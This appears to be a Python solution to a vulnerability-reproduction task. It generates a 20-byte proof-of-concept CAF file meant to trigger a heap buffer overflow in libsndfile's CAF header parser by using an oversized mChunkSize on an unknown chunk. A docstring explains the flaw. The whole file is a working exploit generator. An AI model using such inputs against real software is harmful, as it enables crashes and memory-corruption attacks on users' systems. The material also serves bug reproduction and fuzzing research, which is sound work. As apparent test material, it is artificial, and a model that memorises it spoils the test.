import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a heap buffer overflow
        in the CAF (Core Audio Format) parser of libsndfile.

        The vulnerability (oss-fuzz:382816119) is in the chunk processing loop
        within the `caf_read_header` function. When the parser encounters a
        non-'data' chunk, it calculates the position of the next chunk using
        an `fseek` operation. The offset for this seek is derived from the
        `mChunkSize` field of the current chunk's header, which is read
        directly from the input file.

        The vulnerability lies in the fact that this `mChunkSize` is not
        validated against the file's total size or remaining bytes. By
        providing a chunk with a very large `mChunkSize`, we can cause the
        `fseek` to position the file pointer far beyond the end of the
        file's buffer in memory.

        The subsequent read operation at the start of the next loop iteration,
        which attempts to read the next chunk's header, will then read from
        this out-of-bounds memory location, causing a heap buffer overflow.

        To create a minimal PoC, we use a chunk with an unknown type (e.g., 'xxxx').
        This causes the parser to enter the `default` case of its processing
        switch, which performs no data reading for the chunk itself. This allows
        us to bypass the need for any chunk data, leading to a smaller PoC.

        The PoC consists of:
        1. A standard 8-byte CAF file header.
        2. A 12-byte chunk header with an unknown type and a maximal 64-bit
           size value.
        This results in a total PoC size of 20 bytes.
        """

        # 1. CAF File Header (8 bytes).
        # File type 'caff', version 1, flags 0.
        # The CAF format uses big-endian byte order.
        poc = b'caff\x00\x01\x00\x00'

        # 2. Malicious Chunk Header (12 bytes).
        # An unknown chunk type like 'xxxx' ensures the parser's switch
        # statement defaults to a case that reads no chunk data.
        poc += b'xxxx'

        # A very large chunk size (SInt64_MAX) to cause the subsequent fseek
        # to go far out of bounds. Packed as a big-endian signed 64-bit integer.
        chunk_size = 0x7FFFFFFFFFFFFFFF
        poc += struct.pack('>q', chunk_size)

        return poc